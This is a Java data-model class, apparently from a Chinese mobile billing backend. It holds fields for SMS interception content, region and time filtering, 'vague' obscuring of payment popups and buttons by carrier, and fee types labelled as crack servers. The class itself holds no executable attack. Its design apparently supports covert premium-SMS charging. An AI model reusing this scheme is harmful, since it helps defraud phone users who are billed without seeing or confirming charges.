package model;

public class Cooperation implements java.io.Serializable{

	/**
	 * 
	 */
	private static final long serialVersionUID = -7010472449768473624L;
	public Integer id;
	public String cp_no;
	public String app_no;
	public String channel_no;
	public String packet_id;
	public String settle_type;
    int settle_value;
	int active_num;
	int settle_ratio;
	public String mm_app_no;
	public String mm_app_key;
	public String mm_code;
	public String app_name;
	public String channel_name;
	public String business_no;
	public String discontent;
	public String discontent2;
	public String disurl;
	public String noturl;
    public String exiturl;
    public String payMark;
	public String payUrl;
	public String pay_id;
	public String pay_urlb;
	public String b_del;
	public String fill_con;//短信拦截内容
	public String control_time;//白天控制时间
	public int mm_day_pay;//单用户日限金额
	public int mm_month_pay;//单用户月限金额
	public int mm_channel_pay;//渠道日限金额
	

	public String filter_region;//屏蔽地区
	public String filter_time;//屏蔽时间
	private String filter_begin_day;//屏蔽开始日期
	private String filter_end_day;//屏蔽结束日期
	
	private String vague;//支付模糊处理
	private String vagueTime;//模糊时间
	private String vagueAddr;//模糊地区
	
	private String alert;//弹窗模糊处理
	private String alertTime;//模糊时间
	private String alertAddr;//模糊地区
	
	private String button;//按钮模糊处理
	private String buttonTime;//模糊时间
	private String buttonAddr;//模糊地区
	
	private String ppppp;//模糊处理
	private String pppppTime;//模糊时间
	private String pppppAddr;//模糊地区
	
	private String ver;
	private String cootype;
	//bDel,FillCon
	
	private String mobileVague;
	private String nuicomVague;
	private String telecomVague;
	private String defaultVague;
	
	public Integer cpscount;
	public Integer cpacount;
	



	public static final String CLOSE_FEE = "0";//"本地破解"
	public static final String NATIVE_FEE = "1";//"本地破解"

	public static final String NATIVE2_FEE = "2";//"联网破解"
    public static final String NET_FEE = "3";//"破解服务器"
    public static final String ANNET_FEE = "4";//"安安破解服务器"
    public static final String ZZNET_FEE = "5";//"掌中破解服务器"
    public static final String ShiFen_Uincom_FEE = "6";//"时分联通"
    public static final String ShiFen_Telcom_FEE = "7";//"时分电信"
    public static final String JDNET_FEE = "8";//移动基地
    public static final String QUANW_Telcom_FEE = "9";//电信全网
    public static final String WEB_GAME_FEE = "11";//移动页游
    public static final String LeDong_FEE = "12";//乐动
    public static final String FanHe_FEE = "13";//饭盒
    public static final String Power_FEE = "17";//动力
    public static final String SENT_FEE = "18";//发短信
    public static final String YIXUN_FEE = "19";//易迅
    public static final String DongMan_FEE = "20";//动漫基地
    public static final String Power2_FEE = "21";//动力2
    
    
	public Integer getCpscount() {
		return cpscount;
	}
	public void setCpscount(Integer cpscount) {
		this.cpscount = cpscount;
	}
	public Integer getCpacount() {
		return cpacount;
	}
	public void setCpacount(Integer cpacount) {
		this.cpacount = cpacount;
	}
	public String getMobileVague() {
		return mobileVague;
	}
	public void setMobileVague(String mobileVague) {
		this.mobileVague = mobileVague;
	}
	public String getNuicomVague() {
		return nuicomVague;
	}
	public void setNuicomVague(String nuicomVague) {
		this.nuicomVague = nuicomVague;
	}
	public String getTelecomVague() {
		return telecomVague;
	}
	public void setTelecomVague(String telecomVague) {
		this.telecomVague = telecomVague;
	}
	public String getDefaultVague() {
		return defaultVague;
	}
	public void setDefaultVague(String defaultVague) {
		this.defaultVague = defaultVague;
	}
	public String getCootype() {
		return cootype;
	}
	public void setCootype(String cootype) {
		this.cootype = cootype;
	}
	public String getVer() {
		return ver;
	}
	public void setVer(String ver) {
		this.ver = ver;
	}
	public String getAlert() {
		return alert;
	}
	public void setAlert(String alert) {
		this.alert = alert;
	}
	public String getAlertTime() {
		return alertTime;
	}
	public void setAlertTime(String alertTime) {
		this.alertTime = alertTime;
	}
	public String getAlertAddr() {
		return alertAddr;
	}
	public void setAlertAddr(String alertAddr) {
		this.alertAddr = alertAddr;
	}
	public String getButton() {
		return button;
	}
	public void setButton(String button) {
		this.button = button;
	}
	public String getButtonTime() {
		return buttonTime;
	}
	public void setButtonTime(String buttonTime) {
		this.buttonTime = buttonTime;
	}
	public String getButtonAddr() {
		return buttonAddr;
	}
	public void setButtonAddr(String buttonAddr) {
		this.buttonAddr = buttonAddr;
	}
	public String getPpppp() {
		return ppppp;
	}
	public void setPpppp(String ppppp) {
		this.ppppp = ppppp;
	}
	public String getPppppTime() {
		return pppppTime;
	}
	public void setPppppTime(String pppppTime) {
		this.pppppTime = pppppTime;
	}
	public String getPppppAddr() {
		return pppppAddr;
	}
	public void setPppppAddr(String pppppAddr) {
		this.pppppAddr = pppppAddr;
	}
	public String getVagueAddr() {
		return vagueAddr;
	}
	public void setVagueAddr(String vagueAddr) {
		this.vagueAddr = vagueAddr;
	}
	public String getVague() {
		return vague;
	}
	public void setVague(String vague) {
		this.vague = vague;
	}
	public String getVagueTime() {
		return vagueTime;
	}
	public void setVagueTime(String vagueTime) {
		this.vagueTime = vagueTime;
	}
	
    public void setFilterEndDay(String filter_end_day){
		this.filter_end_day = filter_end_day;
	}
	public String getFilterEndDay(){
		return this.filter_end_day;
	}
	
    public void setFilterBeginDay(String filter_begin_day){
		this.filter_begin_day = filter_begin_day;
	}
	public String getFilterBeginDay(){
		return this.filter_begin_day;
	}
	
    public void setFilterTime(String filter_time){
		this.filter_time = filter_time;
	}
	public String getFilterTime(){
		return this.filter_time;
	}
	
    public void setFilterRegion(String filter_region){
		this.filter_region = filter_region;
	}
	public String getFilterRegion(){
		return this.filter_region;
	}
	
    public void setMmChannelPay(Integer mm_channel_pay){
  		this.mm_channel_pay = mm_channel_pay;
  	}
  	public Integer getMmChannelPay(){
  		return this.mm_channel_pay;
  	}
  	
    public void setMmMonthPay(Integer mm_month_pay){
  		this.mm_month_pay = mm_month_pay;
  	}
  	public Integer getMmMonthPay(){
  		return this.mm_month_pay;
  	}
  	
    public void setMmDayPay(Integer mm_day_pay){
		this.mm_day_pay = mm_day_pay;
	}
	public Integer getMmDayPay(){
		return this.mm_day_pay;		
	}
	
    public void setControlTime(String control_time){
		this.control_time = control_time;
	}
	public String getControlTime(){
		return this.control_time;
	}
	
	public void setFillCon(String FillCon){
		this.fill_con = FillCon;
	}
	public String getFillCon(){
		return this.fill_con;
	}
	
	public void setBDel(String bDel){
		this.b_del = bDel;
	}
	public String getBDel(){
		return this.b_del;
	}
	
	public void setPayUrlb(String payUrlb){
		this.pay_urlb = payUrlb;
	}
	public String getPayUrlb(){
		return this.pay_urlb;
	}
	public String getPayId() {
		return pay_id;
	}
	public void setPayId(String pay_id) {
		this.pay_id = pay_id;
	}
	public void setPayUrl(String payUrl){
		this.payUrl = payUrl;
	}
	public String getPayUrl(){
		return this.payUrl;
	}
	
	public void setPayMark(String payMark){
		this.payMark = payMark;
	}
	public String getPayMark(){
		return this.payMark;
	}
	
	public void setExiturl(String exiturl){
		this.exiturl = exiturl;
	}
	public String getExiturl(){
		return this.exiturl;
	}
	
	public void setId(Integer id){
		this.id=id;
	}
	public Integer getId(){
		return this.id;
	}	

	public void setNoturl(String noturl){
		this.noturl = noturl;
	}
	public String getNoturl(){
		return this.noturl;
	}
	
	public void setDiscontent2(String discontent2){
		this.discontent2=discontent2;
	}
	public String getDiscontent2( ){
		return this.discontent2;
	}
	
	public void setDisurl(String disurl){
		this.disurl=disurl;
	}
	public String getDisurl( ){
		return this.disurl;
	}
	
	public void setDiscontent(String discontent){
		this.discontent=discontent;
	}
	public String getDiscontent( ){
		return this.discontent;
	}
	
	public void setBusinessNo(String business_no){
		this.business_no=business_no;
	}
	public String getBusinessNo( ){
		return this.business_no;
	}
	
	public void setCpNo(String cp_no){
		this.cp_no=cp_no;
	}
	public String getCpNo( ){
		return this.cp_no;
	}
	
	public void setAppNo(String app_no){
		this.app_no=app_no;
	}
	public String getAppNo( ){
		return this.app_no;
	}
	
	public void setChannelNo(String channel_no){
		this.channel_no=channel_no;
	}
	public String getChannelNo( ){
		return this.channel_no;
	}
	
	public void setPacketId(String packet_id){
		this.packet_id=packet_id;
	}
	public String getPacketId( ){
		return this.packet_id;
	}
	
	public void setSettleType(String settle_type){
		this.settle_type=settle_type;
	}
	public String getSettleType( ){
		return this.settle_type;
	}
	
	public void setSettleValue(Integer settle_value){
		this.settle_value=settle_value;
	}
	public Integer getSettleValue(){
		return this.settle_value;
	}	
	
	public void setActiveNum(Integer active_num){
		this.active_num=active_num;
	}
	public Integer getActiveNum(){
		return this.active_num;
	}	
	
	public void setSettleRatio(Integer settle_ratio){
		this.settle_ratio=settle_ratio;
	}
	public Integer getSettleRatio(){
		return this.settle_ratio;
	}	
	          
	public void setMmAppNo(String mm_app_no){
		this.mm_app_no=mm_app_no;
	}
	public String getMmAppNo( ){
		return this.mm_app_no;
	}
	
	public void setMmAppKey(String mm_app_key){
		this.mm_app_key=mm_app_key;
	}
	public String getMmAppKey( ){
		return this.mm_app_key;
	}
	
	public void setMmCode(String mm_code){
		this.mm_code=mm_code;
	}
	public String getMmCode( ){
		return this.mm_code;
	}

	public void setAppName(String app_name){
		this.app_name=app_name;
	}
	public String getAppName( ){
		return this.app_name;
	}

	public void setChannelName(String channel_name){
		this.channel_name=channel_name;
	}
	public String getChannelName( ){
		return this.channel_name;
	}
	
}
